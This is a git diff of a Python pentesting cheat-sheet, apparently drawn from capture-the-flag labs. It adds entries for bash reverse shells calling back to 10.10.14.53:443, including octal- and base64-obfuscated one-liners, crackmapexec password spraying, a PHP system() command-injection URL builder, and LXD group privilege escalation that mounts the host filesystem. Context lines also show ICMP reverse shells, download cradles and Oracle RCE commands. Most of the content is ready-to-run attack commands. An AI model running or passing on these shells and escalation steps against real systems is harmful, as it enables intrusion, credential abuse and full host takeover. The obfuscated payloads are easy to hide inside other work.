@@ -1,13 +1,13 @@
 class Cheat:
-	def __init__(self, name):
-		self.name = name
-		self.category = None
-		self.output = None
-		self.addToList()
+    def __init__(self, name):
+        self.name = name
+        self.category = None
+        self.output = None
+        self.addToList()
 
-	def addToList(self):
-		global cheatList
-		cheatList.append(self)
+    def addToList(self):
+        global cheatList
+        cheatList.append(self)
 
 
 cheatList = []
@@ -29,7 +29,9 @@ Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
 ######################################
 ######################################
 
-icmp_reverse_shell_windows = Cheat("ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)")
+icmp_reverse_shell_windows = Cheat(
+    "ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
+)
 icmp_reverse_shell_windows.category = "Windows"
 icmp_reverse_shell_windows.output = """[*] Reverse Shell when TCP and UDP connection are blocked by Firewall rules.
 
@@ -80,7 +82,9 @@ cacls C:\PATH\File.ext
 ######################################
 ######################################
 
-alternative_data_streams = Cheat("Alternate Data Streams (MetaData), hide file in a file")
+alternative_data_streams = Cheat(
+    "Alternate Data Streams (MetaData), hide file in a file"
+)
 alternative_data_streams.category = "Windows"
 alternative_data_streams.output = """[*] Check for hide data in a file (like stenography for images)
 
@@ -126,6 +130,7 @@ evil_winrm = Cheat("Evil-winrm - (Web Service Management Protocol WS-Management)
 evil_winrm.category = "Windows"
 evil_winrm.output = """[*] Evil-winrm - Automated tool to bind stable shell when WS-Management Protocol is active an open and we have correct credentials
 
+gem install evil-winrm
 evil-winrm -i 10.10.10.57 -u 'administrator' -p '1234test'
 """
 
@@ -168,7 +173,9 @@ sudo restart ipsec
 ######################################
 ######################################
 
-file_transfere_windows_iwr = Cheat("File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe")
+file_transfere_windows_iwr = Cheat(
+    "File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
+)
 file_transfere_windows_iwr.category = "Windows"
 file_transfere_windows_iwr.output = """[*] Simple file transfere for Windows with PowerShell
 
@@ -201,7 +208,9 @@ net localgroup Administrators javali /add
 ######################################
 ######################################
 
-file_transfere_windows_smbserver = Cheat("File Transfere Windows - SmbServer.py (Impacket)")
+file_transfere_windows_smbserver = Cheat(
+    "File Transfere Windows - SmbServer.py (Impacket)"
+)
 file_transfere_windows_smbserver.category = "Windows"
 file_transfere_windows_smbserver.output = """[*] Create Shared Folder by the Internet with SmbServer.py (Impacket)
 
@@ -246,4 +255,121 @@ odat utlfile -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --putFil
 
 # RCE
 odat externaltable -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --exec /Temp shell.exe --sysdba
+"""
+
+######################################
+######################################
+
+crackMapExec = Cheat("crackmapexec - Impacket - 445 TCP")
+crackMapExec.category = "Tools"
+crackMapExec.output = """[*] crackmapexec is a swiss army knife for pentesting network! 
+[*] available protocols: ssh, winrm, mssql, ldap, smb
+
+# SMB enumeration
+crackmapexec smb 10.10.10.193
+crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt
+crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt --continue-on-success | grep -vi "FAILURE"
+crackmapexec smb 10.10.10.193 --shares 
+
+# WinRM enumeration - Check if we can get Interactive shell with a valid user
+crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
+"""
+
+######################################
+######################################
+
+cewl = Cheat("Cewl - Html to Password list")
+cewl.category = "Tools"
+cewl.output = """[*] Simple tool to take all word of a html page and create a file
+
+cewl -w passwords.txt http://10.10.10.100/
+cewl -w passwords.txt http://10.10.10.100/ --with-numbers
+"""
+
+######################################
+######################################
+
+smbpasswd = Cheat("smbpasswd - SMB STATUS_PASSWORD_MUST_CHANGE - Impacket - 445 TCP")
+smbpasswd.category = "Tools"
+smbpasswd.output = """[*] smbpasswd - change a user's SMB password
+
+smbpasswd -r 10.10.10.193 -U "bhult"
+
+"""
+
+######################################
+######################################
+
+seLoadDriverPrivilege = Cheat("SeLoadDriverPrivilege /priv")
+seLoadDriverPrivilege.category = "Windows"
+seLoadDriverPrivilege.output = """[*] SeLoadDriverPrivilege - If Enabled... GG! 
+[*] https://github.com/limitedeternity/ExploitCapcom
+"""
+
+######################################
+######################################
+
+reverseSheel = Cheat("Reverse Shell")
+reverseSheel.category = "Reverse Shells"
+reverseSheel.output = """[*] TCP Reverse Shell - Linux
+
+bash -c 'exec sh -i &>/dev/tcp/10.10.14.53/443 <&1'
+# Octal ofuscation
+echo "bash -c 'exec sh -i &>/dev/tcp/10.10.14.53/443 <&1'" | od -b -An | sed 's/ /\\/g' | tr -d "\n" | xclip -sel clip
+printf "\142\141\163\150\040\055\143\040\047\145\170\145\143\040\163\150\040\055\151\040\046\076\057\144\145\166\057\165\144\160\057\061\060\056\061\060\056\061\064\056\065\063\057\064\064\063\040\074\046\061\047\012" | sh
+
+# Base64 ofuscation
+echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.53/443 <&1'" | base64 -w0 into_clip
+echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDwmMScK | base64 -d | bash
+
+[*] UDP Reverse Shell - Linux
+
+bash -c 'exec sh -i &>/dev/udp/10.10.14.53/443 <&1'
+"""
+
+######################################
+######################################
+
+python_urlEncode = Cheat("UrlEncode - urllib - Python3")
+python_urlEncode.category = "Python"
+python_urlEncode.output = """[*] Convert strings into urlencoded strings for requests
+
+# Don't forgot the " simbole can't be inputed when write cmd.
+# Example: echo "test" => ERROR 404
+# Example: echo 'test' => test
+import urllib
+
+	url = "http://10.10.10.27/admin.php?html="
+	cmd = input("[ Fake Shell ] ")
+	phpCode = urllib.parse.quote_plus(f'<?php system("{cmd}");?>')
+	finalUrl = url + phpCode
+"""
+
+######################################
+######################################
+
+lxd_id = Cheat("Group LXD / Docker")
+lxd_id.category = "Linux"
+lxd_id.output = """[*] PrivEsc with LXD / Docker Group...
+
+# Git clone lxd alpine builder from saghul...
+git clone https://github.com/saghul/lxd-alpine-builder.git
+
+# Build the Docker (maybe many times...) (Need to be root)
+sudo ./build-alpine 
+sudo ./build-alpine -a i686
+
+# Transfere new docker to target!
+sudo python3 -m http.server 80
+wget http://<kali ip>:80/<alpine-name.tar.gz>
+
+# Load the Docker and mount / for see all file with docker root privilege
+# lxd init may not be available, but normally is up so... forgot it
+lxd init
+
+lxc image import ./<alpine-name.tar.gz> --alias javali
+lxc init javali javali-container -c security.privileged=true
+lxc config device add javali-container mydevice disk source=/ path=/mnt/root recursive=true
+lxc start javali-container
+lxc exec javali-container /bin/sh
 """
